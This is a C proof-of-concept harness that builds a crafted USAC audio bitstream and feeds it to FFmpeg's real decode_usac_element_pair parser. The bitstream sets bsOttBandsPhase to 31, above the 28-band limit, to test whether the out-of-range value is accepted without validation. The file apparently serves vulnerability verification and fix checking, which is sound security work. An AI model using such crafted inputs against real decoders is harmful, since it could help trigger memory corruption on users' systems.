/* PoC harness (stage 1): exercises the real USAC element-pair config parser
 * (decode_usac_element_pair) with a crafted bitstream that sets:
 *   bsFreqRes = 1            -> numBands = 28 (mps_fr_nb_bands[1])
 *   bsOttBandsPhasePresent=1
 *   bsOttBandsPhase = 31     -> exceeds numBands (28) by 3
 *   bsPhaseCoding = 1
 *   stereo_config_index = 1  (MPS enabled, residual coding disabled)
 *
 * This is compiled by #include-ing the real, unmodified target source file
 * aacdec_usac.c so we call the actual static function with real target code.
 *
 * Outcome we look for:
 *   - pre_intro / post_intro: decode_usac_element_pair() returns 0 and stores
 *     e.mps.otts_bands_phase == 31 with NO bounds validation against numBands.
 *   - post_benign (fixed): decode_usac_element_pair() returns a negative
 *     error (AVERROR_INVALIDDATA) because 31 > numBands(28), rejecting the
 *     bad value before it can ever be used as an array bound.
 */
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "/work/libavcodec/aac/aacdec_usac.c"

typedef struct { uint8_t buf[256]; int nbits; } BitWriter;
static void bw_put(BitWriter *bw, unsigned val, int width) {
    for (int i = width - 1; i >= 0; i--) {
        int bit = (val >> i) & 1;
        int byte = bw->nbits / 8, off = bw->nbits % 8;
        if (bit) bw->buf[byte] |= (0x80 >> off);
        bw->nbits++;
    }
}

int main(void) {
    BitWriter bw; memset(&bw, 0, sizeof(bw));

    /* decode_usac_sbr_data() fields (consumed because e.sbr.ratio will be 1) */
    bw_put(&bw, 0, 1); /* harmonic_sbr */
    bw_put(&bw, 0, 1); /* bs_interTes */
    bw_put(&bw, 0, 1); /* bs_pvc */
    bw_put(&bw, 0, 4); /* dflt_start_freq */
    bw_put(&bw, 0, 4); /* dflt_stop_freq */
    bw_put(&bw, 0, 1); /* dflt_header_extra1 */
    bw_put(&bw, 0, 1); /* dflt_header_extra2 */

    /* decode_usac_element_pair() fields */
    bw_put(&bw, 1, 2); /* stereo_config_index = 1 */
    bw_put(&bw, 1, 3); /* bsFreqRes = 1 -> numBands = 28 */
    bw_put(&bw, 0, 3); /* bsFixedGainDMX */
    bw_put(&bw, 0, 2); /* bsTempShapeConfig */
    bw_put(&bw, 0, 2); /* bsDecorrConfig */
    bw_put(&bw, 0, 1); /* bsHighRateMode */
    bw_put(&bw, 1, 1); /* bsPhaseCoding = 1 */
    bw_put(&bw, 1, 1); /* bsOttBandsPhasePresent = 1 */
    bw_put(&bw, 31, 5); /* bsOttBandsPhase = 31 (max, > numBands=28) */
    /* stereo_config_index == 1 < 2, so bsResidualCoding fields are absent */

    GetBitContext gb;
    init_get_bits(&gb, bw.buf, sizeof(bw.buf) * 8);

    AACDecContext ac; memset(&ac, 0, sizeof(ac));
    ac.avctx = NULL;

    AACUsacElemConfig e; memset(&e, 0, sizeof(e));
    e.sbr.ratio = 1; /* set as it would be by decode_usac_element_core() */

    int ret = decode_usac_element_pair(&ac, &e, &gb);

    printf("RESULT ret=%d freq_res=%d otts_bands_phase=%d otts_present=%d "
           "phase_coding=%d residual_coding=%d stereo_config_index=%d\n",
           ret, e.mps.freq_res, e.mps.otts_bands_phase,
           e.mps.otts_bands_phase_present, e.mps.phase_coding,
           e.mps.residual_coding, e.stereo_config_index);

    return 0;
}
